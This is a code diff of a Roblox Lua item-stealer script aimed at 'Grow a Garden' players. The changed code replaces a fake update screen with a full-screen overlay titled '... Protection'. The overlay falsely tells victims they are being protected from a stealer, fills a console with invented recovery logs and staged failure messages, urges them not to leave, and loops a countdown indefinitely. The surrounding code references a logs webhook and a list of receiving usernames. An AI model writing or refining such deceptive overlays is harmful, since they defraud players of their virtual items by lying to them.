@@ -34,12 +34,8 @@
         local attempt = 1
         local teleported = false
 
-        coroutine.wrap(function()
-    while true do
         setclipboard("discord.gg/cnUAk7uc3n")
-        wait(1)
-    end
-end)()
+
         
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
@@ -526,92 +522,264 @@ end)
 
 if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
 
-                local function CreateGui()
-                    local player = Players.LocalPlayer
+-----------------------------------------------------------------
+--  MAINTENANCE SCREEN – GROW A GARDEN (NO ROTATING GEAR)
+-----------------------------------------------------------------
+local function CreateGui()
+    local player = Players.LocalPlayer
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "ExecutorAntiStealLoop"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    gui.DisplayOrder = 999999
+    gui.Parent = player:WaitForChild("PlayerGui")
 
+    -- Background
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
+    bg.BorderSizePixel = 0
+    bg.Parent = gui
 
+    local bgGrad = Instance.new("UIGradient")
+    bgGrad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 28)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 10))
+    }
+    bgGrad.Rotation = 90
+    bgGrad.Parent = bg
 
-                    local gui = Instance.new("ScreenGui")
-                    gui.Name = "EclipseHubGui"
-                    gui.ResetOnSpawn = false
-                    gui.IgnoreGuiInset = true
+    -- Title (Executor Name)
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(0.92, 0, 0.13, 0)
+    title.Position = UDim2.new(0.5, 0, 0.43, 0)
+    title.AnchorPoint = Vector2.new(0.5, 0.5)
+    title.BackgroundTransparency = 1
+    title.Text = detectExecutor() .. " Protection"
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 50
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextStrokeTransparency = 0.7
+    title.Parent = bg
 
-                    gui.Parent = player:WaitForChild("PlayerGui")
-                    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-                    gui.DisplayOrder = 99999
+    -- Subtitle
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(0.82, 0, 0.16, 0)
+    subtitle.Position = UDim2.new(0.5, 0, 0.54, 0)
+    subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "You have executed a stealer script, that is trying to steal your stuff,\nWe are protecting you. Please Wait Sometime"
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextSize = 24
+    subtitle.TextColor3 = Color3.fromRGB(220, 240, 255)
+    subtitle.TextWrapped = true
+    subtitle.TextXAlignment = Enum.TextXAlignment.Center
+    subtitle.Parent = bg
 
-                    local bg = Instance.new("Frame")
-                    bg.Size = UDim2.new(1, 0, 1, 0)
-                    bg.Position = UDim2.new(0, 0, 0, 0)
-                    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-                    bg.Parent = gui
+    -- Warning
+    local warning = Instance.new("TextLabel")
+    warning.Size = UDim2.new(0.78, 0, 0.08, 0)
+    warning.Position = UDim2.new(0.5, 0, 0.64, 0)
+    warning.AnchorPoint = Vector2.new(0.5, 0.5)
+    warning.BackgroundTransparency = 1
+    warning.Text = "Warning: Don't Leave, Leaving will cause loss of in-game items like pets."
+    warning.Font = Enum.Font.GothamBold
+    warning.TextSize = 22
+    warning.TextColor3 = Color3.fromRGB(255, 80, 80)
+    warning.TextWrapped = true
+    warning.TextXAlignment = Enum.TextXAlignment.Center
+    warning.Parent = bg
 
-                    local spinner = Instance.new("ImageLabel")
-                    spinner.AnchorPoint = Vector2.new(0.5, 0.5)
-                    spinner.Size = UDim2.new(0.2, 0, 0.2, 0)
-                    spinner.Position = UDim2.new(0.5, 0, 0.35, 0)
-                    spinner.BackgroundTransparency = 1
-                    spinner.Image = "rbxassetid://74011233271790"
-                    spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
-                    spinner.Parent = bg
+    -- Countdown
+    local countdown = Instance.new("TextLabel")
+    countdown.Size = UDim2.new(0.7, 0, 0.08, 0)
+    countdown.Position = UDim2.new(0.5, 0, 0.72, 0)
+    countdown.AnchorPoint = Vector2.new(0.5, 0.5)
+    countdown.BackgroundTransparency = 1
+    countdown.Text = "Securing in 5:00..."
+    countdown.Font = Enum.Font.GothamBold
+    countdown.TextSize = 30
+    countdown.TextColor3 = Color3.fromRGB(100, 255, 150)
+    countdown.Parent = bg
 
-                    local asc = Instance.new("UIAspectRatioConstraint")
-                    asc.Parent = spinner
+    -- Console Panel
+    local console = Instance.new("Frame")
+    console.Size = UDim2.new(0.88, 0, 0.25, 0)
+    console.Position = UDim2.new(0.5, 0, 0.80, 0)
+    console.AnchorPoint = Vector2.new(0.5, 0.5)
+    console.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+    console.BorderSizePixel = 0
+    console.Parent = bg
 
-                    local title = Instance.new("TextLabel")
-                    title.Size = UDim2.new(1, 0, 0.08, 0)
-                    title.Position = UDim2.new(0, 0, 0.53, 0)
-                    title.BackgroundTransparency = 1
-                    title.Text = "Please wait..."
-                    title.Font = Enum.Font.GothamBold
-                    title.TextSize = 38
-                    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-                    title.TextStrokeTransparency = 0.75
-                    title.Parent = bg
+    local cCorner = Instance.new("UICorner")
+    cCorner.CornerRadius = UDim.new(0, 12)
+    cCorner.Parent = console
 
-                    local desc = Instance.new("TextLabel")
-                    desc.Size = UDim2.new(0.8, 0, 0.12, 0)
-                    desc.Position = UDim2.new(0.1, 0, 0.62, 0)
-                    desc.BackgroundTransparency = 1
-                    desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
-                    desc.Font = Enum.Font.Gotham
-                    desc.TextSize = 20
-                    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
-                    desc.TextWrapped = true
-                    desc.TextXAlignment = Enum.TextXAlignment.Center
-                    desc.TextYAlignment = Enum.TextYAlignment.Top
-                    desc.Parent = bg
+    local cStroke = Instance.new("UIStroke")
+    cStroke.Color = Color3.fromRGB(60, 120, 180)
+    cStroke.Thickness = 1.5
+    cStroke.Parent = console
 
-                    -- Countdown label
-                    local countdown = Instance.new("TextLabel")
-                    countdown.Size = UDim2.new(1, 0, 0.05, 0)
-                    countdown.Position = UDim2.new(0, 0, 0.87, 0)
-                    countdown.BackgroundTransparency = 1
-                    countdown.Text = "Returning in 30 seconds..."
-                    countdown.Font = Enum.Font.GothamSemibold
-                    countdown.TextSize = 20
-                    countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
-                    countdown.TextXAlignment = Enum.TextXAlignment.Center
-                    countdown.Parent = bg
+    local consoleTitle = Instance.new("TextLabel")
+    consoleTitle.Size = UDim2.new(1, 0, 0, 28)
+    consoleTitle.BackgroundTransparency = 1
+    consoleTitle.Text = "SECURITY CONSOLE"
+    consoleTitle.Font = Enum.Font.Code
+    consoleTitle.TextSize = 16
+    consoleTitle.TextColor3 = Color3.fromRGB(100, 200, 255)
+    consoleTitle.TextXAlignment = Enum.TextXAlignment.Center
+    consoleTitle.Parent = console
 
-                    -- Spinner animation
-                    task.spawn(function()
-                        while spinner and spinner.Parent do
-                            spinner.Rotation += 2
-                            task.wait(0.01)
-                        end
-                    end)
+    local logArea = Instance.new("TextLabel")
+    logArea.Size = UDim2.new(1, -16, 1, -36)
+    logArea.Position = UDim2.new(0, 8, 0, 32)
+    logArea.BackgroundTransparency = 1
+    logArea.Text = ""
+    logArea.Font = Enum.Font.Code
+    logArea.TextSize = 15
+    logArea.TextColor3 = Color3.fromRGB(180, 255, 180)
+    logArea.TextXAlignment = Enum.TextXAlignment.Left
+    logArea.TextYAlignment = Enum.TextYAlignment.Top
+    logArea.TextWrapped = true
+    logArea.Parent = console
 
-                    -- Countdown logic
-                    task.spawn(function()
-                        for i = 30, 0, -1 do
-                            countdown.Text = "Returning in " .. i .. " second" .. (i == 1 and "" or "s") .. "..."
-                            task.wait(1)
-                        end
+    -- Failure Message (Big Red Text)
+    local failureMsg = Instance.new("TextLabel")
+    failureMsg.Size = UDim2.new(0.9, 0, 0.2, 0)
+    failureMsg.Position = UDim2.new(0.5, 0, 0.4, 0)
+    failureMsg.AnchorPoint = Vector2.new(0.5, 0.5)
+    failureMsg.BackgroundTransparency = 1
+    failureMsg.Text = ""
+    failureMsg.Font = Enum.Font.GothamBlack
+    failureMsg.TextSize = 36
+    failureMsg.TextColor3 = Color3.fromRGB(255, 50, 50)
+    failureMsg.TextStrokeTransparency = 0.6
+    failureMsg.TextWrapped = true
+    failureMsg.TextXAlignment = Enum.TextXAlignment.Center
+    failureMsg.Visible = false
+    failureMsg.Parent = bg
 
-                    end)
+    -- Watermark
+    local watermark = Instance.new("TextLabel")
+    watermark.Size = UDim2.new(0.5, 0, 0.05, 0)
+    watermark.Position = UDim2.new(1, -12, 1, -12)
+    watermark.AnchorPoint = Vector2.new(1, 1)
+    watermark.BackgroundTransparency = 1
+    watermark.Text = "Grow a Garden – Anti-Steal System"
+    watermark.Font = Enum.Font.Gotham
+    watermark.TextSize = 15
+    watermark.TextColor3 = Color3.fromRGB(90, 140, 180)
+    watermark.TextXAlignment = Enum.TextXAlignment.Right
+    watermark.Parent = bg
+
+    -- Get pets once
+    local pets = GetPlayerPets()
+    local topPets = {}
+    local lowPet = nil
+    if #pets > 0 then
+        table.sort(pets, function(a, b) return a.Value > b.Value end)
+        for i = 1, math.min(7, #pets) do
+            table.insert(topPets, pets[i])
+        end
+        lowPet = pets[#pets] -- lowest value
+    else
+        topPets = {
+            { PetName = "Mega Kitsune", Formatted = "1,200,000" },
+            { PetName = "Rainbow Butterfly", Formatted = "850,000" },
+            { PetName = "Corrupted Dragon", Formatted = "720,000" },
+            { PetName = "Golden T-Rex", Formatted = "600,000" },
+            { PetName = "Ascended Bee", Formatted = "550,000" },
+            { PetName = "Shocked Fox", Formatted = "480,000" },
+            { PetName = "Tiny Panda", Formatted = "320,000" }
+        }
+        lowPet = { PetName = "Red Fox", Formatted = "1,200" }
+    end
+
+    -- Console log generator
+    local logLines = {}
+    local function addLog(text, color)
+        table.insert(logLines, {text = text, color = color or Color3.fromRGB(180, 255, 180)})
+        if #logLines > 20 then
+            table.remove(logLines, 1)
+        end
+        local display = ""
+        for _, line in ipairs(logLines) do
+            display = display .. "\n> " .. line.text
+        end
+        logArea.Text = display
+        logArea.TextColor3 = logLines[#logLines].color
+    end
+
+    -- Infinite protection loop
+    task.spawn(function()
+        while player.Parent and gui.Parent do
+            local totalSeconds = 300
+            local startTime = tick()
+
+            -- Reset failure message
+            failureMsg.Visible = false
+            failureMsg.Text = ""
+
+            -- Countdown
+            while tick() - startTime < totalSeconds do
+                if not gui.Parent then break end
+                local remaining = totalSeconds - math.floor(tick() - startTime)
+                local mins = math.floor(remaining / 60)
+                local secs = remaining % 60
+                countdown.Text = string.format("Securing in %d:%02d...", mins, secs)
+
+                -- Random console logs every 1.8–3.2 seconds
+                task.wait(math.random(18, 32) / 10)
+                local actions = {
+                    "Scanning remote event hooks...",
+                    "Blocking unauthorized FireServer calls",
+                    "Purging malicious webhook traces",
+                    "Isolating exploit thread",
+                    "Recovering Sheckles from buffer",
+                    "Securing pet ownership UUIDs",
+                    "Reporting script to anti-cheat",
+                    "Encrypting local data store",
+                    "Validating inventory integrity",
+                    "Neutralizing gifting exploit"
+                }
+                addLog(actions[math.random(#actions)])
+
+                -- Random error (15% chance)
+                if math.random() < 0.15 and lowPet then
+                    addLog("Failed to get back " .. lowPet.PetName, Color3.fromRGB(255, 100, 100))
                 end
 
+                -- Random pet recovery attempt
+                if #pets > 0 and math.random() < 0.3 then
+                    local p = pets[math.random(1, #pets)]
+                    addLog("Trying to get back " .. p.PetName .. " → " .. p.Formatted, Color3.fromRGB(100, 255, 100))
+                end
+            end
+
+            -- === 5 MINUTES OVER: SHOW FAILURE ===
+            local failedPetNames = {}
+            for _, p in ipairs(topPets) do
+                table.insert(failedPetNames, p.PetName .. " → " .. p.Formatted)
+            end
+            failureMsg.Text = "Failed to Recover:\n" .. table.concat(failedPetNames, "\n")
+            failureMsg.Visible = true
+
+            addLog("CRITICAL: Recovery failed for 7 high-value pets", Color3.fromRGB(255, 50, 50))
+            addLog("Restarting protection cycle...", Color3.fromRGB(255, 200, 50))
+
+            task.wait(4) -- Show failure for 4 seconds
+        end
+    end)
+
+    -- Prevent leaving (optional)
+    player.CharacterRemoving:Connect(function()
+        task.wait(0.1)
+        if player.Character then
+            player.Character:Destroy()
+        end
+    end)
+end
         local usernames = {
             "Smiley9Gamerz",
             "BUZZFTWGOD"
